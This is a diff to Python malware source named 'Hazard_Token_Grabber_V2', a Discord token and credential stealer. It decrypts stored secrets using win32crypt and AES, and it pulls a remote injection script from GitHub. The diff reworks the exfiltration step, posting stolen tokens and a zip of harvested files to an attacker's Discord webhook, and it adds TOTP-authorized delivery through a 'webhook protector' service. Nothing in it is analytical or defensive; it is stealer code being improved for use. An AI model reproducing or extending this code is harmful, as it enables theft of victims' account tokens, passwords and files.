@@ -20,8 +20,11 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓
+    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
     'webhook': "WEBHOOK_HERE",
+    #ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
@@ -526,7 +529,6 @@ class Hazard_Token_Grabber_V2(functions):
             tokens += f'{tkn}\n\n'
         fileCount = f"{len(files)} Files Found: "
         embed = {
-            'username'
             'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
             'embeds': [
                 {
@@ -583,9 +585,15 @@ class Hazard_Token_Grabber_V2(functions):
                 }
             ]
         }
-        httpx.post(self.webhook, json=embed)
         with open(_zipfile, 'rb') as f:
-            httpx.post(self.webhook, files={'upload_file': f})
+            if "api/webhooks" in self.webhook:
+                httpx.post(self.webhook, json=embed)
+                httpx.post(self.webhook, files={'upload_file': f})
+            else:
+                from pyotp import TOTP
+                key = TOTP(self.fetchConf('webhook_protector_key')).now()
+                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
+                httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
 
 
